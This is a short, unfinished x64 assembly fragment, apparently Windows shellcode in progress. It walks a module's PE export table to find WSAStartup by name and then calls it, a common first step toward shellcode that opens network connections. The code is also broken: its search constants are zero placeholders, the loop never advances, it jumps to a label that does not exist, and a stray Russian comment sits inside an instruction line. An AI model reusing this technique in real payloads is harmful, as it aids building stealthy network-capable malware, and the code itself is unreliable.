mov eax, dword ptr [r15 + 03Ch]
add rax, r15

mov edx, dword ptr [rax + 088h]
add rdx, r15

mov r8d, dword ptr [rdx + 020h]
add r8, r15

mov r9d, dword ptr [rdx + 024h]
add r9, r15

mov r10d, dword ptr [rdx + 01Ch]
add r10, r15
  
  mov r12, 0 ;WSAStart
  mov r13, 0 ; up\0\0\0\0\0\0

  xor r11, r11
.search_loop_wsastartup
  mov edi, dword ptr [r8 + r11 * 4]
  add rdi, r15

  mov rax, qword ptr [rdi]
  cmp rax, r12
  jne .not_found_wsastartup

  mov rax, qword ptr [rdi + 8]
  cmp rax, r13
  je .fuction_found_wsastartup

.not_found_wsastartup
  movzx r12d, word ptr [r9 + r11 * 2]
  mov eax, dword ptr [r10 + r12 * 4]
  add rax, r15

  mov rbx, rax ; rbx = WSAStartup

  sub rsp, 450

  mov cx, 0202h
  lea rdx, [rsp + 32]

  call rbx

  add rsp, 450 !потом пригодится

